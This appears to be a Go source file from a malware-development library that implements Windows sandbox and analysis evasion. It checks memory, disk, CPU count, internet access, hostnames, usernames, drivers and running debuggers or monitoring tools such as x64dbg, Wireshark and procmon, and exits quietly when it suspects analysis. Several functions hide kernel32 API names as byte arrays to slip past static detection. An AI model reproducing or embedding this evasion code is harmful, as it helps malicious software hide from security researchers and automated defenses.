package core

import (
	"errors"
	"fmt"
	"net/http"
	"os"
	"os/user"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"

	mproc "github.com/D3Ext/maldev/process"
)

const (
	TH32CS_SNAPPROCESS   = 0x00000002
	INVALID_HANDLE_VALUE = ^uintptr(0)
)

type PROCESSENTRY32 struct {
	dwSize              uint32
	cntUsage            uint32
	th32ProcessID       uint32
	th32DefaultHeapID   uintptr
	th32ModuleID        uint32
	cntThreads          uint32
	th32ParentProcessID uint32
	pcPriClassBase      int32
	dwFlags             uint32
	szExeFile           [260]uint16
}

func AutoCheck() error {
	mem_check, err := CheckMemory()
	if err != nil {
		return err
	}

	if mem_check {
		os.Exit(0)
	}

	drivers_check := CheckDrivers()
	if drivers_check {
		os.Exit(0)
	}

	proc_check, err := CheckProcess()
	if err != nil {
		return err
	}

	if proc_check {
		os.Exit(0)
	}

	disk_check, err := CheckDisk()
	if err != nil {
		return err
	}

	if disk_check {
		os.Exit(0)
	}

	internet_check := CheckInternet()
	if internet_check {
		os.Exit(0)
	}

	hostn_check, err := CheckHostname()
	if err != nil {
		return err
	}

	if hostn_check {
		os.Exit(0)
	}

	user_check, err := CheckUsername()
	if err != nil {
		return err
	}

	if user_check {
		os.Exit(0)
	}

	cpu_check := CheckCpu()
	if cpu_check {
		os.Exit(0)
	}

	return nil
}

func CheckMemory() (bool, error) {
	procGlobalMemoryStatusEx := syscall.NewLazyDLL("kernel32.dll").NewProc("GlobalMemoryStatusEx")

	msx := &memStatusEx{
		dwLength: 64,
	}

	r1, _, _ := procGlobalMemoryStatusEx.Call(uintptr(unsafe.Pointer(msx)))
	if r1 == 0 {
		return false, errors.New("An error has occurred while executing GlobalMemoryStatusEx")
	}

	if msx.ullTotalPhys < 4174967296 {
		return true, nil // May be a sandbox
	} else {
		return false, nil // Not a sandbox
	}
}

func CheckDisk() (bool, error) {
	procGetDiskFreeSpaceExW := syscall.NewLazyDLL("kernel32.dll").NewProc("GetDiskFreeSpaceExW")

	lpTotalNumberOfBytes := int64(0)
	diskret, _, err := procGetDiskFreeSpaceExW.Call(
		uintptr(unsafe.Pointer(windows.StringToUTF16Ptr("C:\\"))),
		uintptr(0),
		uintptr(unsafe.Pointer(&lpTotalNumberOfBytes)),
		uintptr(0),
	)

	if diskret == 0 {
		return false, err
	}

	if lpTotalNumberOfBytes < 68719476736 {
		return true, nil
	} else {
		return false, nil
	}
}

func CheckInternet() bool {
	client := http.Client{
		Timeout: 3000 * time.Millisecond, // 3s timeout (more than necessary)
	}

	_, err := client.Get("https://google.com")

	if err != nil {
		return true // May be a sandbox
	}

	return false // Not a sandbox
}

func CheckHostname() (bool, error) {
	hostname, err := os.Hostname()
	if err != nil {
		return false, err
	}

	for _, hostname_to_check := range hostnames_list {
		if hostname == hostname_to_check {
			return true, nil // Probably a sandbox
		}
	}

	return false, nil // Not a sandbox
}

func CheckUsername() (bool, error) {
	u, err := user.Current()
	if err != nil {
		return false, err
	}

	for _, username_to_check := range usernames_list {
		if u.Username == username_to_check {
			return true, nil // Probably a sandbox
		}
	}

	return false, nil // Not a sandbox
}

func CheckCpu() bool {
	if runtime.NumCPU() <= 2 {
		return true // Probably a sandbox
	} else {
		return false // Not a sandbox
	}
}

func CheckDrivers() bool {
	for _, d := range drivers { // Iterate over all drivers to check if they exist
		_, err := os.Stat(d)
		if !os.IsNotExist(err) {
			fmt.Println("Detected sus driver")
			return true // Probably a sandbox
		}
	}

	return false // Not a sandbox
}

func CheckProcess() (bool, error) {
	processes_list, err := mproc.GetProcesses() // Get list of all processes
	if err != nil {
		return false, err
	}

	// Check if at least a quite good amount of processes are running
	if len(processes_list) <= 15 {
		return true, nil // Probably a sandbox
	}

	for _, p := range processes_list {
		for _, p_name := range processes { // Iterate over known VM and sandboxing processes names
			if p.Exe == p_name { // Name matches!
				return true, nil // Probably a sandbox
			}
		}
	}

	return false, nil // Not a sandbox
}

func CheckSandbox() bool {
	processes := []string{
		"ollydbg.exe",
		"ProcessHacker.exe",
		"tcpview.exe",
		"autoruns.exe",
		"autorunsc.exe",
		"filemon.exe",
		"procmon.exe",
		"regmon.exe",
		"procexp.exe",
		"idaq.exe",
		"idaq64.exe",
		"ImmunityDebugger.exe",
		"Wireshark.exe",
		"dumpcap.exe",
		"HookExplorer.exe",
		"ImportREC.exe",
		"PETools.exe",
		"LordPE.exe",
		"SysInspector.exe",
		"proc_analyzer.exe",
		"sysAnalyzer.exe",
		"sniff_hit.exe",
		"windbg.exe",
		"joeboxcontrol.exe",
		"joeboxserver.exe",
		"ResourceHacker.exe",
		"x32dbg.exe",
		"x64dbg.exe",
		"Fiddler.exe",
		"httpdebugger.exe",
		"srvpost.exe",
	}

	processSandbox := false
	for _, process := range processes {
		if IsProcessRunning(process) {
			processSandbox = true
			break
		}
	}

	cpuSandbox := runtime.NumCPU() <= 2
	msx := &memStatusEx{
		dwLength: 64,
	}
	r1, _, _ := syscall.NewLazyDLL(string([]byte{
		'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l',
	})).NewProc(string([]byte{
		'G', 'l', 'o', 'b', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 'S', 't', 'a', 't', 'u', 's', 'E', 'x',
	})).Call(uintptr(unsafe.Pointer(msx)))
	memorySandbox := r1 == 0 || msx.ullTotalPhys < 4174967296
	lpTotalNumberOfBytes := int64(0)
	diskret, _, _ := syscall.NewLazyDLL(string([]byte{
		'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l',
	})).NewProc(string([]byte{
		'G', 'e', 't', 'D', 'i', 's', 'k', 'F', 'r', 'e', 'e', 'S', 'p', 'a', 'c', 'e', 'E', 'x', 'W',
	})).Call(
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("C:\\"))),
		uintptr(0),
		uintptr(unsafe.Pointer(&lpTotalNumberOfBytes)),
		uintptr(0),
	)
	diskSandbox := diskret == 0 || lpTotalNumberOfBytes < 60719476736

	client := http.Client{
		Timeout: 3 * time.Second,
	}
	_, err := client.Get("https://google.com")
	internetSandbox := err != nil

	return cpuSandbox || memorySandbox || diskSandbox || internetSandbox || processSandbox
}

func IsProcessRunning(processName string) bool {
	hSnap, _, _ := syscall.MustLoadDLL(string([]byte{
		'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l',
	})).MustFindProc(string([]byte{
		'C', 'r', 'e', 'a', 't', 'e', 'T', 'o', 'o', 'l', 'h', 'e', 'l', 'p', '3', '2', 'S', 'n', 'a', 'p', 's', 'h', 'o', 't',
	})).Call(uintptr(TH32CS_SNAPPROCESS), 0)
	if hSnap == uintptr(INVALID_HANDLE_VALUE) {
		return false
	}
	defer syscall.MustLoadDLL(string([]byte{
		'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l',
	})).MustFindProc(string([]byte{
		'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e',
	})).Call(hSnap)

	var pe32 PROCESSENTRY32
	pe32.dwSize = uint32(unsafe.Sizeof(pe32))
	ret, _, _ := syscall.MustLoadDLL(string([]byte{
		'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l',
	})).MustFindProc(string([]byte{
		'P', 'r', 'o', 'c', 'e', 's', 's', '3', '2', 'F', 'i', 'r', 's', 't', 'W',
	})).Call(hSnap, uintptr(unsafe.Pointer(&pe32)))

	for ret != 0 {
		if strings.EqualFold(processName, syscall.UTF16ToString(pe32.szExeFile[:])) {
			return true
		}
		ret, _, _ = syscall.MustLoadDLL(string([]byte{
			'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l',
		})).MustFindProc(string([]byte{
			'P', 'r', 'o', 'c', 'e', 's', 's', '3', '2', 'N', 'e', 'x', 't', 'W',
		})).Call(hSnap, uintptr(unsafe.Pointer(&pe32)))
	}

	return false
}
